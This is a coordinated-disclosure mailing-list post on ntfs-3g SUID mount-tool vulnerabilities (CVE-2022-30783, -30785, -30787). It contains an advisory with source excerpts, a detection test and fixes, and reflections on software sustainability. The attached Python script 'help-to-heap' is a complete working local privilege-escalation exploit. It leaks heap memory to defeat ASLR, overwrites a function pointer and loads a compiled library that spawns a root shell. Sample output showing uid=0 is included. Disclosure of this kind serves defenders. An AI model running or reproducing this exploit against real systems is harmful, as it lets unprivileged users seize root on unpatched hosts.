Received: (qmail 18263 invoked by uid 550); 7 Jun 2022 10:39:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 20428 invoked from network); 7 Jun 2022 10:31:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=unparalleled.eu; s=s; h=Message-ID:Date:Content-Type:MIME-Version:Subject:
	To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
	List-Subscribe:List-Post:List-Owner:List-Archive;
	bh=O/5zYBnCMZe+rNGTLz8+PGzIuse5ubT2IkGlE7aKUK4=; b=LbZTWrbI8y5cBfKq1cYRWaw4wc
	6vrO8jzn40oV//fbsERlZF8+n3GLZyrx0iGoK9O4WNsoY+EnxM266XhM2WFf1w0SqziXQuJOikqbZ
	IzD5GaGhqcKJSeHxCg0xwouozmSQ5JP7KI7kLVLyHa+PeUXJbVYLwmVIgE6OOUIzZI9XcZ9wy+bSO
	qK4y2wlfbTx9Pb2pQKDogc5vejYPAvzQU/gdCIkUeS+6vcttiVt2yB9WQaucr9okh62Qq2IQl9394
	bzrEmVWFNLSC7ehczsqacF8SB8Khn07s/fVKl5JK3uXnzfZiupqnDd7CYDchlavj7mpa2AkDkDMxo
	lXQM5onw==;
From: Roman Fiedler <roman.fiedler@unparalleled.eu>
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="----- =_aaaaaaaaaa0"
Date: Tue, 07 Jun 2022 10:30:48 +0000
Message-ID: <3967-1654597848.766953@IHtG.I7uq.0hyU>
Subject: [oss-security] UNPAR-2022-0 Multiple Vulnerabilities in ntfs-3g NTFS Mount Tool

------- =_aaaaaaaaaa0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable

On 20220526 Tuxera Inc. released patches and a security advisory [1]
on multiple vulnerabilities in "ntfs-3g" SUID tool (CVE-2022-30783,
CVE-2022-30785, CVE-2022-30787). As patches are out now for more
than a week, the attached advisory [2] provides additional information
regarding those vulnerabilities. To avoid sitting too long on
already shared exploit code, [3] describes an exploitation strategy
and provides PoC code.

Exploitation is mostly done school book style, using the heap
buffer underread to extract relevant addresses and break ASLR,
also to calculate the offset to heap sprayed initial payload
(with memory massaging upstream of the underread buffer), use
the initial payload to perform single byte overwrites of a function
pointer to call "dlopen" in the end. Only the overwrite technique
is somehow creative as it leverages a crafted NTFS image so that
the lowest byte of the inode number is used for overwriting -
thus supporting also writes non-text encodable bytes, e.g null.


While working on the vulnerability analysis and digging through
the "ntfs-3g" heap memory [3], I was also digging through thrash
heaps on stage in a theater production [4] on physical, emotional
and digital trash, always with sustainablility in mind. Only
a small number of thoughts on digital resource usage and sustainability
could be included in the play, but there might be quite some
interesting links between OSS IT security (or open source development
in general) and sustainability, so I would like to share my thoughts
and that to get feedback:

1) IT security has definitely environmental, economical and societal
impact, thus being worth analyzed regarding sustainability according
to definition of it. Secure software and good incident handling
may improve sustainable productivity (avoid resource loss in
incident handling, more units per ton CO2 produced), avoid
societal damage (surveilance of regime critics using undisclosed
vulnerabilites, unavailability or distrust in govermental or
public health systems). But vulnerability disclosure or EOL of
old/insecure/unmaintainable code may also speed up hardware obsolescence
as older devices are less likely to see updates.

2) Software development and maintenance consumes lot of resources.
This would be fine, as long as the output is worth it. Is maintaining
redundant code, developing features nobody needs, fixing security
issues that could be easily avoided therefore ethical? As in
the vulnerabilities disclosed above, are there 3 different but
partially overlapping SUID mount tools (/bin/mount, fusermount,
ntfs-3g) needed, could modularization and reuse reduce the attack
surface and therefore make those tools more sustainable?

3) If sustainability considerations would be part of ethical
software development or ethical hacking, how to find out what
would really improve the situation to define it as best practices?
Apart from technicalities (do proposed measures really fix the
problem) there might be also a lot of very controversial general
ethical questions to be adressed. While open sorce explosive
device construction might be seen as doing more harm than good
(also true for Ukrain and other conflict areas?), what about
providing insecure, unmaintainable, too complex software to
users, more likely to hurt them by data loss/leakage or even
cause collateral damage as trampoline for other attacks?

4) How are productivity of software use and amount of software
features and thus attack surface linked? For business software
at least articles indicate, that more features are likely to
impair usability, user experience and in the end productivity.
Would less be more in the end? Could simpler software both
stop the ongoing rise in IT security damage cost and resource
waste, make the software user more productive and reduce the
load on the maintainer? Or would that just backfire by reducing
creativity in software development and software use, hampering
the development of e.g. more efficent production or consumption
schemes, keep old and energy inefficient hardware longer on the
market?

This is only a small set of thoughts that came up to be cast
into words. I am interested (maybe offlist) in more ideas on
the topic, any feedback expanding my thoughts, references to
previous work on the topic, ... For those near Graz, helpful
feadback may win you a free theater ticket for the next season,
if the play is resumed after summer :-)

Regards,
Roman Fiedler

[1] https://github.com/tuxera/ntfs-3g/security/advisories/GHSA-6mv4-4v73-xw=
58
[2] https://unparalleled.eu/publications/2022/advisory-unpar-2022-0.txt
[3] https://unparalleled.eu/blog/2022/20220607-help-to-heap-suid-privilege-=
escalation/
[4] https://schauspielhaus-graz.buehnen-graz.com/play-detail/trashland/


| |  DI Roman Fiedler
| /  roman.fiedler at unparalleled.eu  Unparalleled IT Services e.U.
/ |  +43 677 63 29 28 29               Felix-Dahn-Platz 4, 8010 Graz, AUT
| |  https://unparalleled.eu/          FN: 516074h       VAT: ATU75050524

------- =_aaaaaaaaaa0
Content-Type: text/plain; name="advisory-unpar-2022-0.txt";
	charset="us-ascii"
Content-Description: advisory-unpar-2022-0.txt
Content-Disposition: attachment; filename="advisory-unpar-2022-0.txt"
Content-Transfer-Encoding: quoted-printable

Multiple Vulnerabilities in ntfs-3g NTFS Mount Tool
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

Advisory:     UNPAR-2022-0
Component:    ntfs-3g
Vendor:       https://github.com/tuxera/ntfs-3g
Version(s):   Up to release 2021.8.22
Weakness(es): Write-what-where Condition (CWE-123)
              Unexpected Status Code or Return Value (CWE-394)
              Numeric Range Comparison Without Minimum Check (CWE-839)
CVE:          CVE-2022-30783 CVE-2022-30785 CVE-2022-30787
CVSS:         Base score 7.8: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/
              S:U/C:H/I:H/A:H/E:H/RL:O/RC:C/CR:L/IR:L/AR:L/
              MAV:L/MAC:L/MPR:L/MUI:N/MS:U/MC:H/MI:H/MA:H
Author:       Roman Fiedler


Summary:
=3D=3D=3D=3D=3D=3D=3D=3D

NTFS-3G is an open-source cross-platform implementation of the
Microsoft Windows NTFS file system with read/write support.
NTFS-3G often uses the FUSE file system interface, so it can
run unmodified on many different operating systems. [1]

The "ntfs-3g" SUID binary allows unprivileged users to mount
a NTFS file system via FUSE to a directory the user owns. A logic
flaw in the "help" option parsing grants an attacker access to
the FUSE file descriptor intended to communicate with the kernel
via "/dev/fuse". Combining the file descriptor access with an
integer overflow and other memory access flaws provides full
read-write access to memory, circumventing ASLR and thus arbitrary
code execution.

Timeline:
* 20220503: Contact with Debian Package Maintainer, Debian Security
  and upstream maintainer; vulnerability analysis, exploit and
  patch suggestion handed over
* 20220504: Maintainer requested CRD to be handled by Tuxera Inc.
* 20220509: PoC verified by Tuxera Inc., more memory issues found,
  CVE(s) were requested
* 20220526: CRD of patches, advisory [2]
* 20220607: Advisory with PoC published


Details:
=3D=3D=3D=3D=3D=3D=3D=3D

* Logic flaw with "--help":

The function "fuse_kern_mount" from "libfuse-lite/mount.c" is
expected to return a FUSE file descriptor on success or -1 to
indicate an error. With the "--help" command line option, "mo.ishelp"
is true, thus res=3D0 is returned instead of acquiring a FUSE file
descriptor by calling "fusermount" instead. Thus "ntfs-3g" assumes
to communicate with the kernel using the unrelated file descriptor
0 (stdin).

int fuse_kern_mount(const char *mountpoint, struct fuse_args *args)
{
...
    int res =3D -1;
...
    res =3D 0;
    if (mo.ishelp)
        goto out;
...
    res =3D fusermount(0, 0, 0, mnt_opts ? mnt_opts : "", mountpoint);
...
out:
...
    return res;


* Integer underflow in "readdir":

The function "fuse_lib_readdir" in "libfuse-lite/fuse.c" is used
to report directory entries to the kernel, which will then be
shown as content of the mounted fuse file system. It was not
checked if this code can also be reached without the previous
"--help" flaw, e.g. having NTFS images with large number of entries,
malformed NTFS images or concurrent "readdir" and directory or
NTFS image modification. Combined with the previous vulnerability,
the functionality to resume directory reads at a given offset
can be abused to read memory at negative offsets.

static void fuse_lib_readdir(fuse_req_t req, fuse_ino_t ino, size_t size,
                             off_t off, struct fuse_file_info *llfi)
...
    if (dh->filled) {
        if (off < dh->len) {
            if (off + size > dh->len)
                size =3D dh->len - off;
        } else
            size =3D 0;
    } else {
        size =3D dh->len;
        off =3D 0;
    }
...

As "ntfs-3g" memory returned by "fuse_lib_readdir" is not copied
but sent using "writev", no SEGV is triggered for unmapped addresses.
"ntfs-3g" will see an EFAULT error, which is even reported but
otherwise ignored:

fuse: writing device: Bad address


* Using the memory address of directory structures as directory
  handle:

"ntfs-3g" uses the internal memory address of "struct fuse_dh"
as a directory handle to allow the kernel to identify directories
on the FUSE protocol. This is quite definitely no vulnerability
by itself, as there seems really no way to control this value
from userspace. Other bugs or severe logic flaws seem mandatory
to access the relevant code.

The function "fuse_lib_opendir" from "libfuse-lite/fuse.c" will
return the heap address of "struct fuse_dh" as directory handle:

static void fuse_lib_opendir(fuse_req_t req, fuse_ino_t ino,
                       struct fuse_file_info *llfi)
{
...
    dh =3D (struct fuse_dh *) malloc(sizeof(struct fuse_dh));
    if (dh =3D=3D NULL) {
        reply_err(req, -ENOMEM);
        return;
    }
    memset(dh, 0, sizeof(struct fuse_dh));
    dh->fuse =3D f;
    dh->contents =3D NULL;
    dh->len =3D 0;
    dh->filled =3D 0;
    dh->nodeid =3D ino;
    fuse_mutex_init(&dh->lock);

    llfi->fh =3D (uintptr_t) dh;
...

In directory related operations the kernel will then use the
file/directory handle to identify the directory, e.g. in the
function "fuse_lib_readdir" from "libfuse-lite/fuse.c":

static void fuse_lib_readdir(fuse_req_t req, fuse_ino_t ino, size_t size,
                             off_t off, struct fuse_file_info *llfi)
...
    struct fuse_dh *dh =3D get_dirhandle(llfi, &fi);

Applying standard exploitation techniques therefore allow memory
read and subsequently also write at arbitrary user specified addresses.


Impact:
=3D=3D=3D=3D=3D=3D=3D

Exploitation of the vulnerabilities allows privileged code
execution with UID 0.

For Debian Bullseye a reliable ASLR-aware PoC exists, for
PoC code and details on exploitation see [3].


Vulnerable Systems:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Vulnerable systems contain the "/bin/ntfs-3g" with SUID bit set.
On Debian Bullseye the SUID bit is set by "postinstall" during
Debian package installation.

To test for the flaw, use following commands, and check for the
existance of the "short read on fuse device" in the output:

$ dd if=3D/dev/zero bs=3D2M count=3D1 of=3Dimage
...
$ /sbin/mkfs.ntfs --force image
...
$ /bin/ntfs-3g -o --help,no_detach image dir-dont-care < /dev/null
...
short read on fuse device
...


Mitigation:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

On unpatched systems the SUID bit should be removed from "ntfs-3g".

There might be a way recommended by Tuxera to use it without
the additional SUID privileges as there is a message embedded
in the binary, but the link does not seem functional any more.

write(2, "User doesn't have privilege to mount. For more information\npleas=
e see: http://tuxera.com/community/ntfs-3g-faq/#unprivileged\n", 125) =3D 1=
25


Fix:
=3D=3D=3D=3D

See published upstream security advisory [2] and patches (version
2022.5.17) [4] [5] for full program code changes.

* Logic flaw with "--help":

Return an error code (number below zero) when handling the "--help"
option as the caller of the vulnerable function expects a FUSE
file descriptor on success as return value.

* Integer underflow in "readdir":

Do not allow reading the buffer at negative offsets by refusing
to accept negative offset values.

* Using the memory address of directory structures as directory
  handle:

As a hardening measure the direct and unchecked use of user
space addresses as file handles could be avoided. Instead file
handles could be indexes into a table of open files, checking
that the index is sane. Flaws would then only cause unintended
operations on other open resources and not arbitrary memory access.


Proof of Concept:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

The "help-to-heap" program demonstrates ASLR-aware exploitation
of the combined vulnerabilities on Debian Bullseye. For other
binary versions, the the delta from the "mknod" fuse function
pointer to a "dlopen" call has to be calculated. For PoC code
and details on exploitation see [3].

$ ./help-to-heap
...
fuse: writing device: Bad address
* returning 0xf0a0 bytes
Maybe struct match dir 0x55a0bef3f580 with content 0x55a0bef41000 test 0x55=
a0bef3f580
Assuming heap start at 0x55a0bef32000 with 0xf0a0 bytes data extracted
Got fuse_fs address 0x55a0bef3f030.
Got mknod op: 0x55a0bd3adcb0
New address 0x55a0bd3ba6a0
Type shell commands:
id
uid=3D0(root) gid=3D100(users) groups=3D100(users)
...


Discussion:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

There might be some take aways from these vulnerabilities:

* In SUID (privileged) context everything is security critical:

Even such basic function as "--help" just writing to stdout/stderr
has to implemented carefully to ensure that there are no unexpected
side effects on the whole program.

* Apply highest coding standards to all code pathes:

Functions that were never seen as part of the attack surface
as they should only be invoked with sane parameters, privileged
user or kernel, ... might get accessible due to bugs and then
become the new last line of defence against compromised.

* Minimize privileged code by program logic changes:

Key to exploitation of "ntfs-3g" was the fact, that the program
never fully dropped all privileges but only temporary changed
EUID to the unprivileged user UID. The reason for that seems
to be, that the same process was used to mount the NTFS image,
serve the image data via FUSE and umount in the end. Therefore
nearly all program functions, from NTFS image parsing to FUSE
protocol handling are somehow part of the attack surface. By
changing the program logic, that could be avoided, e.g. by forking
and only the privileged parent process performing mount/umount
operations while the child irreversibly drops all privileges
before starting NTFS image parsing and FUSE protocol.

* Minimize privileged code by code reuse:

A better solution could be to drop all SUID functionality completely
as there exists another SUID tool exactly specialised in secure
mounting and umounting for userspace file systems: "fusermount".
It is usually already part of the attack surface on machines with
FUSE support installed, hence using the very same tool avoids
a similar attack surface in "ntfs-3g". Thus UNIX-style code
deduplication by use of small (command line) tools, that also
reduces the amount of security critical code to be maintained
and therefore waste of human and IT resources, which may also
improve the environmental impact of open source software.


Credits:
=3D=3D=3D=3D=3D=3D=3D=3D

* Tuxera Inc. (code review, patching, testing, CRD handling)


Revision History:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

* 20220607: UNPAR-2022-0 advisory released


References:
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1] https://en.wikipedia.org/wiki/NTFS-3G
[2] https://github.com/tuxera/ntfs-3g/security/advisories/GHSA-6mv4-4v73-xw=
58
[3] https://unparalleled.eu/blog/2022/20220607-help-to-heap-suid-privilege-=
escalation/
[4] Help option patch
  https://github.com/tuxera/ntfs-3g/commit/7f81935f32e58e8fec22bc46683b1b06=
7469405f
[5] Readdir offset check
  https://github.com/tuxera/ntfs-3g/commit/fb28eef6f1c26170566187c1ab7dc913=
a13ea43c

------- =_aaaaaaaaaa0
Content-Type: text/plain; name="help-to-heap"; charset="us-ascii"
Content-Description: help-to-heap
Content-Disposition: attachment; filename="help-to-heap"
Content-Transfer-Encoding: quoted-printable

#!/usr/bin/python3 -BbbEIsSttW all
"""This software is provided by the copyright owner "as is"
and WITHOUT ANY EXPRESSED OR IMPLIED WARRANTIES, including,
but not limited to, the implied warranties of merchantability
and fitness for a particular purpose are disclaimed. In no
event shall the copyright owner be liable for any direct,
indirect, incidential, special, exemplary or consequential
damages, including, but not limited to, procurement of substitute
goods or services, loss of use, data or profits or business
interruption, however caused and on any theory of liability,
whether in contract, strict liability, or tort, including
negligence or otherwise, arising in any way out of the use
of this software, even if advised of the possibility of such
damage.

Copyright (c) 2022 Unparalleled IT Services e.U.
https://unparalleled.eu/blog/2022/20220607-help-to-heap-suid-privilege-esca=
lation/

The software is only provided for reference to ease understanding
and fixing of an underlying security issue in "ntfs-3g".
Therefore it may NOT be distributed freely while the security
issue is not fixed and patched software is available widely.
After that phase permission to use, copy, modify, and distribute
this software according to GNU Lesser General Public License
(LGPL-3.0) purpose is hereby granted, provided that the above
copyright notice and this permission notice appear in all
copies.

This program demonstrates how to expoit the userspace file
system mount tool "ntfs-3g" using the "--help" option."""


import os
import socket
import struct
import subprocess
import sys
import time


def buildFuseHeader(command, nodeId):
  """Build the 40 byte fuse header."""
  return (
      b'\x00\x00\x00\x00' + struct.pack('<I', command) + \
      b'AAAAAAAA' + struct.pack('<Q', nodeId) + \
      b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00qqqq')

def unpackLong(data, offset):
  """Convencience method to unpack a long value from memory at
  given location."""
  return struct.unpack('<Q', data[offset:offset+8])[0]

def packLong(value):
  return struct.pack('<Q', value)

def getMem(memData, memStart, address, length):
  """Convenience method to get memory at a given address from
  a block of memory.
  @param memData the memory data block.
  @param memStart the start address of the memory data block.
  @param address the address to extract data from.
  @param length the length of data to extract."""
  offset =3D address - memStart
  if (offset < 0) or (offset + length > len(memData)):
    return None
  return memData[offset:offset + length]


class ExploitContext:
  def __init__(self):
# This is the socket used by ntfs-3g to perform fuse protocol communication.
    self.fuseSocket =3D None
# Keep the reference to one file for truncating and writing,
# see readMemory().
    self.fileNodeId =3D None
    self.heapReadDirHandleAddress =3D None
    self.heapReadDirContentAddress =3D None
    self.heapReadDirContentOffset =3D None
    self.heapStartAddess =3D None
    self.heapData =3D None
    self.fuseStructAddress =3D None
    self.ntfs3gProcess =3D None
# This table stores the file names with suitable inode numbers.
    self.inodeTable =3D None

  def ntfs3gInit(self):
    if self.ntfs3gProcess is not None:
      raise Exception()
    self.fuseSocket, childSocket =3D socket.socketpair()
    self.ntfs3gProcess =3D subprocess.Popen(
        ['/bin/ntfs-3g', '-o', '--help,no_detach', 'image', 'mnt'],
        stdin=3DchildSocket.fileno())
    childSocket.close()

  def ntfs3gClose(self):
    self.fuseSocket.close()
    self.fuseSocket =3D None
    self.ntfs3gProcess.wait()
    self.ntfs3gProcess =3D None

  def lookupNode(self, name):
    """Lookup, return nodeid"""
# FUSE_LOOKUP 1
    self.fuseSocket.send(buildFuseHeader(1, 1) + name + b'\x00')
    result =3D self.fuseSocket.recv(1<<16)
    if len(result) =3D=3D 16:
      return None
    return unpackLong(result, 16)

  def truncateNode(self, nodeId, length):
# FUSE_SETATTR 4
    self.fuseSocket.send(
        buildFuseHeader(4, nodeId) +
        b'\x08\x00\x00\x00\x00\x00\x00\x00' + b'\x00' * 8 + packLong(length=
))
    self.fuseSocket.recv(1<<16)

# FUSE_MKDIR 9
  def fuseMkdir(self, nodeId, name):
    self.fuseSocket.send(
        buildFuseHeader(9, nodeId) +
        b'\x00\x00\x00\x00\x00\x00\x00\x00' + name + b'\x00')
    return self.fuseSocket.recv(1<<16)[16:]

# FUSE_RMDIR 11
  def rmdir(self, nodeId, name):
    self.fuseSocket.send(
        buildFuseHeader(0xb, nodeId) + name + b'\x00')
    return self.fuseSocket.recv(1<<16)

  def writeNode(self, nodeId, offset, length, data):
# FUSE_WRITE 16
    if len(data) < length:
      raise Exception()
    self.fuseSocket.send(
        buildFuseHeader(0x10, nodeId) + \
        b'\xff\x00\x00\x00\x00\x00\x00\x00' + \
        struct.pack('<QQ', offset, length) + data)
    return self.fuseSocket.recv(1<<16)

  def fuseSetXAttr(self, nodeId):
    """Set the system.ntfs_object_id=3DABC extended attribute on
    the given node."""
# FUSE_SETXATTR 21
    self.fuseSocket.send(
        buildFuseHeader(0x15, nodeId) + \
        b'BBBB' + b'\x00' * 4 + b'system.ntfs_object_id\x00' + b'ABC' * 0x4=
0 + b'\x00')
    print('FUSE_SETXATTR result %s' % repr(self.fuseSocket.recv(1<<16)))

  def fuseInit(self):
# FUSE_INIT 26
    self.fuseSocket.send(
        buildFuseHeader(0x1a, 0) + b'\x08\x00\t\x00')
    print('Result %s' % repr(self.fuseSocket.recv(1<<16)))

  def openDir(self, nodeId):
# FUSE_OPENDIR 27
    self.fuseSocket.send(
        buildFuseHeader(0x1b, nodeId))
    fuseReply =3D self.fuseSocket.recv(1<<16)
    return unpackLong(fuseReply, 16)

  def fuseReadDir(self, nodeId, dirHandleAddress, offset, length):
# FUSE_READDIR 28
    self.fuseSocket.send(
        buildFuseHeader(0x1c, nodeId) + \
        struct.pack('<qqq', dirHandleAddress, offset, length))
    return self.fuseSocket.recv(1<<16)[16:]

  def fuseCreate(self, name, dirNodeId):
    """Create a file on the image."""
# FUSE_CREATE 35:
    self.fuseSocket.send(
        buildFuseHeader(0x23, dirNodeId) + \
        b'\xff\x05\x00\x00\xa4\x81\x00\x00' + name + b'\x00')
    print('FUSE_CREATE result %s' % repr(self.fuseSocket.recv(1<<16)))

  def buildInodeTable(self, path):
    """Build a table containing one entry per inode LSB."""
    dirNodeId =3D self.lookupNode(path)
    nodeDict =3D {}
    nameId =3D 0
    while len(nodeDict) !=3D 0x100:
      nodeId =3D self.lookupNode(b'%s/%x' % (path, nameId))
      if nodeId is None:
        self.fuseMkdir(dirNodeId, b'%x' % nameId)
        nodeId =3D self.lookupNode(b'%s/%x' % (path, nameId))
      inodeInfo =3D self.fuseReadDir(
          nodeId, self.heapReadDirHandleAddress, 0, 0x400)
      if inodeInfo[0] not in nodeDict:
        nodeDict[inodeInfo[0]] =3D nameId
      nameId +=3D 1
    self.inodeTable =3D [nodeDict[x] for x in range(0, 256)]

  def readHeap(self):
    heapData =3D self.fuseReadDir(
        1, self.heapReadDirHandleAddress,
        0 - self.heapReadDirContentOffset, self.heapReadDirContentOffset)
    return heapData

  def readMemory(self, address, length, readOffset=3D1, nodeId=3D1):
    """@param readOffset when not 0, only read is performed.
    Otherwise memory may be overwritten first.
    @param nodeId the directory node ID to read from."""
    if self.fuseStructAddress is None:
      raise Exception()

# Build a fake "struct fuse_dh" entry.
    fakeDirData =3D b'\x00' * 0x28 + packLong(self.fuseStructAddress) + \
        b'\x00' * 8 + packLong(address - readOffset) + \
        struct.pack(
            '<IIIIQQ', length + readOffset, length + readOffset,
            0, readOffset, 0, 0)
    self.truncateNode(self.fileNodeId, 0)
    self.writeNode(self.fileNodeId, 0x40, 0x80, fakeDirData + (b'A' * 0x80))

    allMem =3D self.readHeap()
    writeDataOffset =3D allMem.find(fakeDirData)
    if writeDataOffset =3D=3D -1:
      raise Exception('No readback')
    writeDataAddress =3D self.heapStartAddess + writeDataOffset
    memData =3D self.fuseReadDir(
        nodeId, writeDataAddress, readOffset, length)
    return memData


  def getDirHandleMemory(self, dirHandleAddress):
    memStart =3D None
    contentAddress =3D None
    nextStep =3D 0x4000
    memData =3D realDirData =3D self.fuseReadDir(1, dirHandleAddress, 0, 0x=
400)
# Do not block, we will not see any response for invalid memory
# addresses.
    self.fuseSocket.setblocking(False)
    offset =3D -nextStep
    while nextStep !=3D 0:
      self.fuseSocket.send(
          buildFuseHeader(0x1c, 1) + \
          struct.pack('<qqq', dirHandleAddress, offset, 0x100) + \
          b'\x01\x00\x00\x00AAAAAAAAAAA')
# Sleep a little while.
      time.sleep(0.1)
      dirData =3D b''
      try:
        dirData =3D self.fuseSocket.recv(1<<16)[16:]
      except:
        pass
      if dirData =3D=3D b'':
        delta =3D int((nextStep + 1) / 2)
        offset +=3D delta
        nextStep -=3D delta
        continue
      if dirData =3D=3D realDirData:
# We reread the real directory data from the NTFS image, this
# should never happen here.
        raise Exception('Unexpected memory state')
      if len(dirData) < nextStep:
        print('Wrong length read %d vs %d' % (len(dirData), nextStep))
        continue
      memData =3D dirData[:nextStep] + memData
      memStart =3D offset
      offset -=3D nextStep

    self.fuseSocket.setblocking(True)
    print('* returning 0x%x bytes' % len(memData))
    for pos in range(0, len(memData) - 7):
      contentAddress =3D unpackLong(memData, pos)
# If this directory entry is the one we are using for reading,
# then the offset has to be the difference between the contentAddress
# and this position. 0x38 is the contentAddress field offset
# in the directory structure.
      testAddress =3D contentAddress + offset + pos - 0x38
      if testAddress =3D=3D dirHandleAddress:
        print('Maybe struct match dir 0x%x with content 0x%x test 0x%x' % (
            dirHandleAddress, contentAddress, testAddress))
        return (contentAddress + memStart, contentAddress, memData)
    return (memStart, None, memData)

  def writeMemory(self, targetAddress, targetData):
    """Write targetData plus a short tail to the given address."""
    while targetData:
      nodeId =3D self.lookupNode(b'Dir/%x' % self.inodeTable[targetData[0]])
# This memory read will first write the data in "fuse_add_dirent"
# as readOffset is 0.
      self.readMemory(targetAddress, 0x40, 0, nodeId=3DnodeId)
      targetAddress +=3D 1
      targetData =3D targetData[1:]


  def initExploit(self):
    """Initialize the directory structure, NTFS image and helper
    library to run the exploit. The exploit has to be run with
    the working directory writable by the current user."""
    if not os.path.exists('mnt'):
      os.mkdir('mnt')

    if os.path.exists('image'):
      os.unlink('image')

    iFile =3D open('image', 'wb')
    iFile.write(b'\x00' * (1 << 21))
    iFile.close()
    subprocess.check_call([
        '/bin/sh', '-c',
        '/sbin/mkfs.ntfs --force image && /bin/ntfs-3g image mnt && ' + \
            'mkdir mnt/Dir && touch mnt/File && umount mnt'])

# Rebuild the helper library.
    if os.path.exists('/tmp/s.so'):
      os.unlink('/tmp/s.so')
    subprocess.run(
        'gcc -Wall -fPIC -x c -o s.o -c -'.split(' '),
        check=3DTrue,
        input=3Dbytes("""#define _GNU_SOURCE
#include <unistd.h>
extern void _init() {
    setresuid(0, 0, 0);
    char* args[2];
    args[0]=3D"/bin/sh";
    args[1]=3DNULL;
    execve(args[0], args, NULL);
}""", 'ascii'))
    subprocess.check_call(
        'ld -shared -Bdynamic s.o -o /tmp/s.so'.split(' '))
# This is the first run, so build the inode table without really
# executing the payload.
    self.runExploit()


  def runExploit(self):
    """Run the exploit code. This requires an appropriate NTFS
    image with crafted inode numbers to be available. If the
    image is not ready yet, all required inodes are created and
    the function terminates without attempting exploitation as
    after those operations the heap is in a really bad shape."""
    self.ntfs3gInit()
    self.fuseInit()

# Have a file node reference for heap spraying.
    self.fileNodeId =3D self.lookupNode(b'File')

# Massage the heap to appropriate shape.
    self.fuseSetXAttr(self.fileNodeId)
    self.fuseCreate(b'XXXYYYYY', 1)

    self.heapReadDirHandleAddress =3D dirHandleAddress =3D self.openDir(1)
    print('OPENDIR: Address dirhandle 0x%x' % dirHandleAddress)
    self.fuseReadDir(1, dirHandleAddress, 0, 0x4000)

    if self.inodeTable is None:
      self.buildInodeTable(b'Dir')
      self.ntfs3gClose()
      return

    memStart, contentAddress, memData =3D self.getDirHandleMemory(
        dirHandleAddress)
    print(
        'Assuming heap start at 0x%x with 0x%x bytes data extracted' % (
            memStart, len(memData)))
    if contentAddress is None:
      raise Exception()
    dirStructOffset =3D dirHandleAddress - memStart
    dirStructData =3D memData[dirStructOffset:dirStructOffset+0x60]
    fuseStructAddress =3D unpackLong(dirStructData, 0x28)

    self.heapReadDirContentAddress =3D contentAddress
    self.heapReadDirContentOffset =3D contentAddress - memStart
    self.heapStartAddess =3D memStart
    self.heapData =3D memData
    self.fuseStructAddress =3D fuseStructAddress

    fuseFsAddress =3D unpackLong(
        getMem(memData, memStart, fuseStructAddress, 0x110), 0x108)
    print('Got fuse_fs address 0x%x.' % fuseFsAddress)

    mknodFunctionAddress =3D unpackLong(
        getMem(memData, memStart, fuseFsAddress, 0x80), 0x10)
    print('Got mknod op: 0x%x' % mknodFunctionAddress)
    mknodFunctionPtrAddress =3D fuseFsAddress + 0x10
    checkData =3D self.readMemory(mknodFunctionPtrAddress, 0x8)
    if checkData !=3D packLong(mknodFunctionAddress):
      raise Exception()

    selectReparsePluginAddress =3D packLong(mknodFunctionAddress + 0x14b7)
    self.writeMemory(
        mknodFunctionPtrAddress, selectReparsePluginAddress)
    checkData =3D self.readMemory(mknodFunctionPtrAddress, 0x8)
    if selectReparsePluginAddress !=3D checkData:
      raise Exception('Update to function address failed')
# Finally call mknod and load the shared library.
# FUSE_MKNOD 8
    self.fuseSocket.send(
        buildFuseHeader(0x8, 1) + \
        b'\xff\x05\x00\x00\xa4\x81\x00\x00' + b'tmp/s.so\x00')

# The privileged process is just a subprocess of this process
# so forward our stdin data to it.
    print('Type shell commands:')
    while True:
      try:
        line =3D sys.stdin.readline()
        self.fuseSocket.send(bytes(line, 'utf-8'))
      except BrokenPipeError:
        self.ntfs3gClose()
        break




def main():
  """This is the program main function."""
  context =3D ExploitContext()
  context.initExploit()
  context.runExploit()

if __name__ =3D=3D '__main__':
  main()

------- =_aaaaaaaaaa0--
